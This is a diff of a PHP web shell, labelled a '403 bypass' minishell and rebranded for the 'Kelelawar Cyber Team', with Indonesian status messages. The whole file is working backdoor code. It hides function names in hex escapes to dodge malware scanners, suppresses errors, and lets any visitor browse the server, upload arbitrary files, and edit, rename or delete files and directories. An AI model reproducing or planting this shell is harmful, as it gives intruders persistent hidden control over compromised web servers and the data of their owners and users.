@@ -1,14 +1,15 @@
 <?php
 
 /*
-    Bypass 403 Forbidden / Auto Delete Shell / PHP Malware Detector / Minishell
+    Code By Kelelawar Cyber Team
+    Bypass 403 Forbidden / Auto Delete Shell / PHP Malware Detector / Minishell Bypass 403
 */
 
 set_time_limit(0);
 error_reporting(0);
 error_log(0);
 
-$sname       = "\x30\x62\x79\x74\x33\x6d\x31\x6e\x31" . "-V2";
+$sname       = "<font color=white><b><h5>KELELAWAR CYBER TEAM</h5>";
 $__gcdir     = "\x67" . "\x65\x74\x63\x77\x64";
 $__fgetcon7s = "\x66\x69\x6c\x65" . "\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
 $__scdir     = "s" . "\x63\x61\x6e\x64\x69" . "r";
@@ -21,9 +22,8 @@ if (get_magic_quotes_gpc()) {
     }
 }
 
-echo '<!DOCTYPE html><html><head><meta name="robots" content"noindex. nofollow"><link href="https://fonts.googleapis.com/css?family=VT323" rel="stylesheet"><title>'.$sname.'</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><link href="https://github.com/KelelawarCyberTeam/Shell-Bypass-403/blob/main/terbaru/css.css" rel="stylesheet" type="text/css"></head><body>';
-
-echo '<div style="color:#ef6c00;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
+echo '<!DOCTYPE html><html><head><link href="http://kelelawarcyberteam.com/terbaru/css.css" rel="stylesheet" type="text/css"><title>xXx Kelelawar Cyber Team xXx</title></head><body style=background-color:black;>';
+echo '<div style="color:red;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
 if (isset($_GET['path'])) {
     $path = $_GET['path'];
     chdir($_GET['path']);
@@ -32,8 +32,8 @@ if (isset($_GET['path'])) {
 }
 $path  = str_replace("\\", "/", $path);
 $paths = explode("/", $path);
-echo '<table width="100%" border="0" align="center" style="margin-top:-10px;"><tr><td>';
-echo "<font style='font-size:13px;'>Path: ";
+echo '<table width="90%" border="0" align="center" style="margin-top:-10px;"><tr><td>';
+echo "<font style='font-size:13px;'>Path Dir: ";
 foreach ($paths as $id => $pat) {
     echo "<a style='font-size:13px;' href='?path=";
     for ($i = 0; $i <= $id; $i++) {
@@ -44,18 +44,18 @@ foreach ($paths as $id => $pat) {
     }
     echo "'>$pat</a>/";
 }
-echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#ef6c00;margin-bottom:4px;"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
+echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="20%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:white;margin-bottom:4px;"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
 if (isset($_FILES['file'])) {
     if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
-        echo '<center><font color="#00ff00">Upload OK!</font></center><br/>';
+        echo '<center><font color="white">Upload OK!</font></center><br/>';
     } else {
-        echo '<center><font color="red">Upload FAILED!</font></center><br/>';
+        echo '<center><font color="red">Bisa upload!</font></center><br/>';
     }
 }
 echo '</td></tr><tr><td></table><div class="table-div"></div><input id="image" type="hidden">';
 echo '';
 if (isset($_GET['filesrc'])) {
-    echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';
+    echo '<table width="80%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';
     echo "" . basename($_GET['filesrc']);
     "";
     echo '</tr></td></table><br />';
@@ -65,9 +65,9 @@ if (isset($_GET['filesrc'])) {
     if ($_POST['opt'] == 'rename') {
         if (isset($_POST['newname'])) {
             if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
-                echo '<center><font color="#00ff00">Rename OK!</font></center><br />';
+                echo '<center><font color="white">Rename OK!</font></center><br />';
             } else {
-                echo '<center><font color="red">Rename Failed!</font></center><br />';
+                echo '<center><font color="red">Rename Gagal!</font></center><br />';
             }
             $_POST['name'] = $_POST['newname'];
         }
@@ -76,13 +76,13 @@ if (isset($_GET['filesrc'])) {
         if (isset($_POST['src'])) {
             $fp = fopen($_POST['path'], 'w');
             if (fwrite($fp, $_POST['src'])) {
-                echo '<center><font color="#00ff00">Edit File OK!.</font></center><br />';
+                echo '<center><font color="white">Edit File OK!.</font></center><br />';
             } else {
-                echo '<center><font color="red">Edit File Failed!.</font></center><br />';
+                echo '<center><font color="red">Edit Gagal!.</font></center><br />';
             }
             fclose($fp);
         }
-        echo '<form method="POST"><textarea cols=80 rows=20 name="src">' . htmlspecialchars($__fgetcon7s($_POST['path'])) . '</textarea><br /><input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>';
+        echo '<form method="POST"><textarea cols=100 rows=25 name="src">' . htmlspecialchars($__fgetcon7s($_POST['path'])) . '</textarea><br /><input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>';
     }
     echo '</center>';
 } else {
@@ -90,13 +90,13 @@ if (isset($_GET['filesrc'])) {
     if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
         if ($_POST['type'] == 'dir') {
             if ($rm__dir($_POST['path'])) {
-                echo '<center><font color="#00ff00">Dir Deleted!</font></center><br />';
+                echo '<center><font color="white">Dir Deleted!</font></center><br />';
             } else {
                 echo '<center><font color="red">Delete Dir Failed!</font></center><br />';
             }
         } elseif ($_POST['type'] == 'file') {
             if ($un__link($_POST['path'])) {
-                echo '<font color="#00ff00">Delete File Done.</font><br />';
+                echo '<font color="white">Delete File Done.</font><br />';
             } else {
                 echo '<font color="red">Delete File Error.</font><br />';
             }
@@ -104,13 +104,13 @@ if (isset($_GET['filesrc'])) {
     }
     echo '</center>';
     $_scdir = $__scdir($path);
-    echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"> <th><center>Name</center></th><th width="12%"><center>Size</center></th><th width="10%"><center>Permissions</center></th> <th width="15%"><center>Last Update</center></th><th width="11%"><center>Options</center></th></tr>';
+    echo '<div id="content"><table width="90%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"> <th><center>Name</center></th><th width="10%"><center>Size</center></th><th width="9%"><center>Permissions</center></th> <th width="10%"><center>Last Update</center></th><th width="10%"><center>Options</center></th></tr>';
     foreach ($_scdir as $dir) {
         if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
             continue;
-        echo "<tr><td>[D] <a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>";
+        echo "<tr><td>[Dir] <a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>";
         if (is_writable("$path/$dir"))
-            echo '<font color="#00ff00">';
+            echo '<font color="white">';
         elseif (!is_readable("$path/$dir"))
             echo '<font color="red">';
         echo perms("$path/$dir");
@@ -129,9 +129,9 @@ if (isset($_GET['filesrc'])) {
         } else {
             $size = $size . ' KB';
         }
-        echo "<tr><td>[F] <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>" . $size . "</center></td><td><center>";
+        echo "<tr><td>[File] <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>" . $size . "</center></td><td><center>";
         if (is_writable("$path/$file"))
-            echo '<font color="#00ff00">';
+            echo '<font color="white">';
         elseif (!is_readable("$path/$file"))
             echo '<font color="red">';
         echo perms("$path/$file");
@@ -173,7 +173,5 @@ function perms($file)
     $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
     return $info;
 }
-echo '<br><center>&copy; <span id="footer"></span> 2018.</center><br>';
-echo '<script type="text/javascript" src="https://github.com/KelelawarCyberTeam/Shell-Bypass-403/blob/main/terbaru/footer.js"></script>';
 echo '</body></html><!-- EOF -->';
 ?>
